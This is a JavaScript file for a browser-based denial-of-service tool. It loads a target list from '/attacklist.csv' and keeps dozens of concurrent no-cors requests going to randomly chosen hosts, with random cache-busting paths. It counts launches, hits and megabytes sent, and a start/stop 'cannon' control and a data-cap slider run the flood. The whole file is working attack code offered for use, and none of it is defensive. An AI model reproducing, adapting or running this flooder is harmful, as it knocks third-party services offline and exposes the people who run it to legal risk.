(function () {
  var timeout = 5000;

  var elements = {
    btnStart: document.getElementById("btnAction"),
    btnStop: document.getElementById("btnStop"),
    counter: document.getElementById("txtCounter"),
    stats: document.getElementById("txtStats"),
    mbInput: document.querySelector("#mbInput input"),
    mbVal: document.querySelector("#mbInput .val"),
  };

  var counter = localStorage.getItem('iCounter') ? JSON.parse(localStorage.getItem('iCounter')) : {
    total: 0,
    hit: 0,
  };

  var inputs = {
    mb: elements.mbInput.mbVal
  }

  var stats = localStorage.getItem('iStats') ? JSON.parse(localStorage.getItem('iStats')) : {
    bytes: {
      host: {},
      total: {
        upload: 0,
        download: 0
      }
    }
  }

  // for multi-tab support
  window.addEventListener("storage", function () {
    counter = localStorage.getItem('iCounter') ? JSON.parse(localStorage.getItem('iCounter')) : counter;
    stats = localStorage.getItem('iStats') ? JSON.parse(localStorage.getItem('iStats')) : stats;
    refreshCounter();
    refreshStats();
  })

  var isActive = false

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>, Size: <strong>${getTotalTransferMb().toFixed(1)} MB</strong>`;
  }

  if (counter.total > 0) {
    setTimeout(refreshCounter, 1);
  }

  function renderInput() {
    elements.mbVal.innerHTML = !inputs.mb ? 'Unlimited' : `${inputs.mb} MB`
  }

  function refreshStats() {
    // elements.stats.innerHTML = JSON.stringify(stats, null, 2)
  }

  function mbInputChange() {
    inputs.mb = elements.mbInput.value == 100 ? null : elements.mbInput.value
    renderInput()
  }
  elements.mbInput.addEventListener('input', mbInputChange)
  mbInputChange()

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      let id = 0;
      res.text().then((list) => {
        var targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            var row = i.split(",");
            return {
              key: id++,
              title: row[0],
              method: row[1],
              host: row[2],
              port: row[3],
              path: row[4],
            };
          });
        cb(targets);
      });
    });
  };

  var getMaxConcurrent = function () {
    return 30;
  }

  window.stopCannon = function() {
    elements.btnStart.style.display = "initial";
    elements.btnStop.style.display = "none";
    isActive = false;
  }

  var calcRequestUploadBytes = function (target, url) {
      // TODO: factor in TLS?
      return (target.method || 'GET').length 
        + 1
        + url.length
        + 5  // http
        + 300 // headers
        + (target.body || '').length
  }

  var calcRequestDownloadBytes = function (res) {
      return 10
        + Array.from(res.headers.entries()).reduce(function (a, i) {
          return a + i.join(': ').length
        }, 0)
        + 500 // cant retrieve body so guess
  }

  var updateStats = function (host, type, bytes) {
    if (!stats.bytes.host[host]) {
      stats.bytes.host[host] = {upload: 0, download: 0}
    }

    stats.bytes.host[host][type] += bytes
    stats.bytes.total[type] += bytes
    localStorage.setItem('iStats', JSON.stringify(stats))
    refreshStats();
  }

  var updateCounter = function(type, inc) {
    counter[type] += inc
    localStorage.setItem('iCounter', JSON.stringify(counter))
    refreshCounter()
  }

  var getTotalTransferMb = function () {
    return (stats.bytes.total.upload + stats.bytes.total.download) / 1024 / 1024
  }

  window.launchCannon = function (bytes, progressCb, done) {
    var maxConcurrent = getMaxConcurrent();
    elements.btnStart.style.display = "none";
    elements.btnStop.style.display = "initial";
    isActive = true;

    getTargets(function (targets) {
      function fireRequests() {
        function fire() {
          var target = targets[Math.floor(Math.random() * targets.length)];
          if (!isActive) { return }
          updateCounter('total', 1)

          var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;

          if (inputs.mb !== null && getTotalTransferMb() >= inputs.mb) {
            stopCannon()
            return
          }

          var url = `https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`;
          var method = target.method || 'GET';
          new Promise((resolve, reject) => {
            let controller = new AbortController();
            fetch(url, {
              method,
              signal: controller.signal,
              timeout: 5000,
              mode: "no-cors",
            }).then(resolve).catch(reject)
            setTimeout(() => {
              controller.abort()
            }, timeout)
          })
          .then(function (res) {
            updateStats(target.host, 'download', calcRequestDownloadBytes(res))
          })
          .finally(function (err) {
            updateCounter('hit', 1)
            fire();
          });

          updateStats(target.host, 'upload', calcRequestUploadBytes(target, url))
        }

        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }

      fireRequests();
    });
  };
})();
